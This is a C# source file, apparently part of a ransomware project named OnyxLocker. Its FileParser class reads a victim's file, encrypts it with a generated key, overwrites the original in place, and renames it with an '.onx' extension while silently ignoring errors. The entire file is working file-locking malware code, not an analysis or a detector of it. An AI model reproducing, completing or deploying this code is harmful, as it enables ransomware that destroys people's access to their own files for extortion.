using System;
using System.IO;

namespace OnyxLocker
{
    internal class FileParser : IFileParser
    {
        private IEncryptionProvider EncryptionProvider;
        private byte[] KeyBytes;

        public FileParser(IEncryptionProvider encryptionProvider)
        {
            EncryptionProvider = encryptionProvider;
            KeyBytes = EncryptionProvider.CreateEncryptionKey();
        }

        public void ParseFile(string filePath)
        {
            var fileBytes = GetFileBytes(filePath);
            var encryptedFileBytes = EncryptionProvider.EncryptBytes(fileBytes, KeyBytes);
            WriteFileBytes(filePath, encryptedFileBytes);

            var fileExtension = Path.GetExtension(filePath);
            var newFilePath = filePath.Replace(fileExtension, ".onx");

            try
            {
                File.Move(filePath, newFilePath);
            }
            catch
            {
            }

            GC.Collect();
        }

        private byte[] GetFileBytes(string filePath)
        {
            using (var fileStream = File.OpenRead(filePath))
            {
                var fileBytes = new byte[fileStream.Length];
                try
                {
                    fileStream.Read(fileBytes, 0, Convert.ToInt32(fileStream.Length));
                    fileStream.Close();

                    return fileBytes;
                }
                finally
                {
                    fileStream.Close();
                }
            }
        }

        private void WriteFileBytes(string filePath, byte[] fileBytes)
        {
            using (var fileStream = File.OpenWrite(filePath))
            {
                if (fileStream.CanWrite)
                {
                    fileStream.Write(fileBytes, 0, Convert.ToInt32(fileBytes.Length));
                }
            }
        }
    }
}